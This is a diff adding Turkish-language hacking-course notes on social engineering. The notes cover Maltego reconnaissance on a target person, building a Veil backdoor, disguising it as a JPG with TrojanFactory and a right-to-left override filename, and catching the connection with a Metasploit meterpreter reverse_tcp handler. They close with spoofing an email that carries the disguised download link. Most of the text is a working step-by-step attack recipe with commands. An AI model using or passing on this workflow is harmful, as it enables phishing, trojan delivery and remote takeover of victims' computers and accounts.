@@ -1,0 +1,104 @@
+	SOCIAL ENGINEERING
+ Önceki bölümlerde gördüğümüz backdoor'du
+ Bu backdoor'u nasıl trojan halinde gösterebiliriz,
+ kullanıcılar hakkında bilgi edinme gibi şeyleri göreceğiz.
+
+ Hackerların kötü amaçlı kullanıcılara saldırırken kişiler hakkında bilgi toplaması,
+ ve bu bilgilerden kişilerin zaaflarını bulup onu kullanarak, şahsın instagram hesabını hacklemek vs.
+
+
+
+
+
+	MALTEGO
+ -Maltego- (not defterinin aynısı)
+ Bize kullanıcılar hakkında bilgi toplamamızı sağlar.
+ Kali'den Maltego aratarak girebilirsiniz.
+ Sol üstteki + butonu ile New Graph oluşturabiliriz.
+ Sol kısımda gözüken paletler ile neyi araştırmamız gerektiğini girebiliriz.
+ Örneğin Website paletini seçtik, unicornitems.com gibi bir site girersek,
+ uygulama bize o site hakkında detaylı bilgileri gösterir.
+
+ Person paletini kullandığımızda o kişi hakkında bilgi edinebiliriz.
+ Sonuçlarda Udemy çıktıysa "isim + Udemy" diye aratabiliriz.
+ O kişi hakkında çıkan görsellerden birisini indirelim. İndirdiğimiz görseli backdoor'umuza nasıl ekleriz? Nasıl ikon yaparız?
+ exe dosyasının ikonunu jpg gibi yapalım. "create ico from jpg online" diye aratalım. Görselimizi siteye yükleyelim. exe dosyamızın ikonunu istediğimiz jpg yaptık.
+ Şimdi ise görselimiz ve ikonumuz olduğuna göre backdoor'umuzu, trojana çevirebiliriz.
+ Öncelikle bir backdoor oluşturalum. cd /opt/Veil/ içerisine python3 Veil.py yazarak backdoor oluşturabiliriz.
+ use 1		tcp bağlantısı seçelim. (ne seçtiğimiz önemli değil)	use 7	Gerekli ayarları yaptıktan sonra backdoor'umuzu kaydedelim. (NewPayload.exe)
+ Şimdi ise backdoor'umuzu jpg ile birleştirelim. https://github.com/atilsamancioglu/TrojanFactory
+
+
+
+
+
+	EXE DOSYASINI NASIL JPG GİBİ GÖSTEREBİLİRİZ?
+ AutoIt, Backdoor'u JPG gibi gösterirken işe yarar.
+cd /opt/TrojanFactory/
+service apache2 start	-> Kendi ip adresimize girip dosyamızın URL'sini alıyoruz.
+"python3 trojan_factory.py --help" yazıp hangi uzantıları girebileceğimizi  görebiliriz. (-f -e -o -i) gibi
+
+python3 trojan_factory.py -f http://10.0.2.10/backdoors/atilsam.jpg -e http://10.0.2.10/backdoors/NewPayload.exe -o /opt/TrojanFactory/newtest.exe -i http://10.0.2.10/backdoors/atilsam.ico
+	.ico dosyamızı bulamadığı için /opt/TrojanFactory/icons/  -> içerisindeki generic.ico zaten varolan ikonu sildik ve kendi ikonumuzu bu klasöre atıp ismine generic.ico adını verdik.
+
+
+	-f -> Hangi dosyayı göstermek istiyoruz.
+	-e -> Evil File (Kötü Dosya) backdoor'umuzun kendisi.
+	-o -> Nereye koymak istediğimizi gireriz.
+
+
+ Sanal makinemizden 10.0.2.10/backdoors/ adresine girip newtest.exe dosyasını indirirsek dosyanın jpg gibi gözüktüğünü görebiliriz.
+ msfconsole'umuzu açarak dinlemeye başlayabiliriz. (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
+msfconsole
+use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 10.0.2.10
+exploit		-> exploit -j -z Yazarsak arka planda dinler.
+
+ Sanal makinemizden indirmiş olduğumuz newtest.exe dosyasını açarsak normal görsel olarak gözükür.
+ ve Meterpreter Sessioun'ımız uyanmış olacaktır.
+
+sessions -l	-> Listeleme yapar.
+sessions -1	-> 1.Session'ımızın içine girer.
+ls		-> Windowsu hacklemeyi başardığımızı görebiliriz.
+
+
+
+
+
+	DOSYA UZANTISI NASIL DEĞİŞTİRİLİR?
+ Dosyamızın sonu .exe ile bitiyor bu şüpheli bir durumdur, bunun uzantısını da değiştirmemiz gerekiyor.
+ Bunun için: apt-get install characters -> Sol üstten Kali'ye tıklayıp Char yazıp açabiliriz. Buradan "right-to-left Override" karakterini kopyalıyoruz.
+ right-to-left Override nasıl çalışır?: androidpgj.exe olan dosyamızı sağdan sola doğru ters çevirir yani bu dosyanın çıktısı androidexe.jpg olacaktır.
+ Değiştirmek istediğimiz dosyayı(androidgpj.exe) Rename yapıp, gpj.exe olan kısma yani ters çevirmek istediğimiz yere yapıştır yapıyoruz ve gpj.exe yazıyoruz.
+ Kullandığımız araç bize bunu ters yazdıracak ve dosya uzantısı androidexe.jpg olarak gözükecektir.
+
+ Tekrardan msfconsole'umuza girelim.(msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
+msfconsole
+use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 10.0.2.10
+exploit -j- z
+
+ Sanal makinemizden (Hedef bilgisayarımızdan) indirmiş olduğumuz dosyayı açıyoruz bu sefer hem uzantısı .jpg hem de gerçekten görsel gibi gözüküyor.
+ ve Session'umuz açılmış olacaktır.
+
+sessions -l
+sessions -1
+ls		-> Yeniden cihazımızı Hacklemeyi başardık.
+
+
+
+
+	EMAİLLERİ DEĞİŞTİRMEK
+Hackerlar genelde bu dosyayı zip olarak yükler .exe gibi inmez ve böylece antivirüs programlarına yakalanma olasılığı azalır.
+Özellikle kötü niyetli hackerlar atılan mail'i özel birinden geliyormuş gibi gösterebilir.
+Email spoofing işlemlerini yapabileceğimiz birçok site var. "anonymous email sender"
+mailspre.com -> web sitesi işimizi görecektir. Mail'in açıklama kısmına right-to-left yaptığımız jpg.exe dosyasının linkini koyuyoruz.
+									http://10.0.2.10/backdoors/android%e2%80%aegpj.exe
+Mail'i alan kişi bu linki indirirse bize bağlantı göndermiş olacak ve şahsın cihazını hacklemiş olacağız.
+
+Biz tüm işlemleri kendi web server'larımız(10.0.2.10/backdoors) üzerinden gerçekleştirdik fakat "file upload" sitelerinden (dropbox gibi) bazı siteler de bu işlemi gerçekleştirebilir.
+Bazı siteler .exe dosyalarına izin vermediği için hackerlar genelde önce bu dosyayı zip'e çevirir ve daha sonra siteye upload eder.
